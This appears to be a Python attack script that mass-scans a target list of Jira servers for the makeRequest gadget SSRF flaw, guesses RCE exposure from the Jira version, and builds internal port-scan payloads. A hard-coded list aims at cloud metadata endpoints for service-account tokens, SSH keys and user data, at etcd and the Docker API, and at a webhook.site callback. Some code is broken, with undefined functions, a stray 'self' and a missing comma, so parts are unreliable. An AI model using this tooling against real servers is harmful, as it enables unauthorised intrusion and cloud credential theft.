import requests
import multiprocessing
import json
import sys
import locale
import os
from bs4 import BeautifulSoup
from jirassrf2 import *
import re
from threading import Thread
import requests
from signal import signal, SIGINT
from sys import exit
import win32com.client
speaker = win32com.client.Dispatch("SAPI.SpVoice")

requests.packages.urllib3.disable_warnings()

ssrf_url = "www.baidu.com"
vuln_results = []
vuln_urls = []

ssrf_csp_etc = [
"metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",
"metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json",
"169.254.169.254/metadata/v1.json",
"100.100.100.200/latest/meta-data/image-id",
"webhook.site/2caeaf98-d0b7-468a-a451-c7064884a18c",
"100.100.100.200/latest/meta-data/instance-id",
"100.100.100.200/latest/meta-data/nvpc-cidr-block",
"http://169.254.169.254/metadata/v1/maintenance",
"http://169.254.169.254/openstack",
"http://169.254.169.254/2009-04-04/meta-data/",
"http://192.0.0.192/latest/",
"http://192.0.0.192/latest/user-data/",
"http://192.0.0.192/latest/meta-data/",
"http://192.0.0.192/latest/attributes/",
"http://127.0.0.1:2379/version",
"http://127.0.0.1:2379/v2/keys/?recursive=true",
"127.0.0.1:2375/v1.24/containers/json"
"192.168.1.1:80"
]




class TargetList:
   #thanks devil for letting me butcher your thread module for this lol
    def __init__(self, targetlist_path):

        with open(targetlist_path, 'r') as f:
            self.target_list = f.read().splitlines()

        self.length = len(self.target_list)

    def generate_chunks(self):

        k, m = divmod(len(self.target_list), THREADS)
        for i in range(THREADS):
            yield self.target_list[i * k + min(i, m):(i + 1) * k + min(i + 1, m)]




def comapre_versions(v1, v2):
    print("in compare versions")
    for i, j in zip(map(int, v1.split(".")), map(int, v2.split("."))):
        if i == j:
            continue
        return i > j
    return len(v1.split(".")) > len(v2.split("."))


def ssrf_poc_handler(hosts):
    for host in hosts:
        try:
           result = ssrf_poc(host)
           if result:
              print(result)
              vuln_results.append(result)
  
        except Exception as ohno1:
            print(ohno1)



            
def ssrf_poc(url):
    vuln_info = {}

    print(type(url))
    if url[-1] == '/':
        url = url[:-1]
    else:
        url = url

    vuln_url = url + "/plugins/servlet/gadgets/makeRequest?url=" + str(url) + '@' + str(ssrf_url)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "X-Atlassian-Token": "no-check",
        "Connection": "close"
    }

    try:
        version_req = requests.get(url=url, headers=headers, verify=False, timeout=3)
        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=3)
        if "200" in str(r.status_code):

            if 'don\'t be evil\'' in r.text:
                soup = BeautifulSoup(version_req.text, "html.parser")
                hidden_tags = soup.find_all("input", type="hidden")
                for tag in hidden_tags:
                    if "JiraVersion" in repr(tag):
                        version = repr(tag)
                        r1 = re.search('[0-9]{1}\.[0-9]{1}\.[0-9]{1}', str(version))
                      
                        v1 = '8.4.0'
                        #print("max Version : " + v1) this is highest ssrf version so dont test otherwise
                        result = comapre_versions(v1, r1.group(0))

                        if result == False:
                           #print(" Version seems to indicate it's probably not vulnerable.")
                           vuln_info['url'] = url
                           vuln_info['ssrf_url'] = ssrf_url
                           vuln_info['Vulnerable'] = True
                           vuln_info['ssrf_check_version'] = str(r1.group(0))
                           vuln_info['vuln_to_rce'] = "Not Likely"
                           vuln_info['response_body'] = r.text
                           vuln_urls.append(url)
                           return json.dumps(vuln_info)

                        else:
                           #print(" Version seems to indicate it might be vulnerable to Rce as well!")

                           vuln_info['url'] = url
                           vuln_info['ssrf_url'] = ssrf_url
                           vuln_info['Vulnerable'] = True
                           vuln_info['ssrf_check_version'] = str(r1.group(0))
                           vuln_info['vuln_to_rce'] = "Possible"
                           vuln_info['response_body'] = r.text
                           vuln_urls.append(url)
                           return json.dumps(vuln_info)


        else:
            pass

    except Exception as shit:
        print(shit)
        pass


def jira_ssrf_port_scan():
    payloads = []
    ports = ['21','22','23','25','80','111','161','137','443','445','2049','3306','8080','8443','9200','9000','11211','6379','10050']
    for port in ports:
        pass1= "127.1.1.1:"+port+"#\@127.2.2.2:"+port+"/"
        pass2 = "[::]:"+port+"/"
        pass3 = "localhost:"+port
        pass4 = "0.0.0.0:"+port
        pass5 = "127.0.0.1:"+port
        payloads.append(pass1)
        payloads.append(pass2)
        payloads.append(pass3)
        payloads.append(pass4)
        payloads.append(pass5)
    return  payloads





def check_rce(url):
      print("Sending Rce test...")
      target = url + self.rce_check
      try:
         response,status,xsrf_code = self.send_request_rce(target)
         if "200" in str(status) and xsrf_code:
            print("Successful "+str(status))

            if "Contact Site Administrators"  in response:
                print(response)

      except Exception as damn:
          print(damn)
          pass


def exploit_ssrf(all_lines):
   jira_ports = jira_ssrf_port_scan()
   valid_csp_hits = []
   for line in all_lines:
       hits = []
       tmp_url = line
       
       for ssrf_tests in jira_ports:
           try:

              response,status,headers = check_Aws_ssrf(tmp_url,ssrf_tests)
              if '"rc":200' in response:
                 print(" Host appears to be vulnerable port is open: " +ssrf_tests)
                 print(response)
                 hits.append(ssrf_tests)


              if '"rc":500' in response:
                 print(" Host appears to be vulnerable but port is closed! ")
                 
           except:
               pass
       host_info = {}
       host_info['url'] = tmp_url
       host_info['csp_hits'] = hits
       print(json.dumps(host_info))
       valid_csp_hits.append(json.dumps(host_info))

   for info  in valid_csp_hits:
       print(info)



if __name__ == "__main__":
    THREADS = 4
    try:
        speaker.Speak("Generating TargetList...")
        Target_List = TargetList('new.txt')
        Target_List_chunk = Target_List.generate_chunks()
        print("TargetList length: {} url's.".format(Target_List.length))

        print("Generating  threads...")


        for _ in range(THREADS):
            p = Thread(target=ssrf_poc_handler, args=(next(Target_List_chunk),))
            p.daemon = True
            p.start()

        for _ in range(THREADS):
            p.join()

   
    except Exception as wtf:
        print(wtf)
        outwrite.close()
        pass

print("Generating Payloads")
print(vuln_urls)



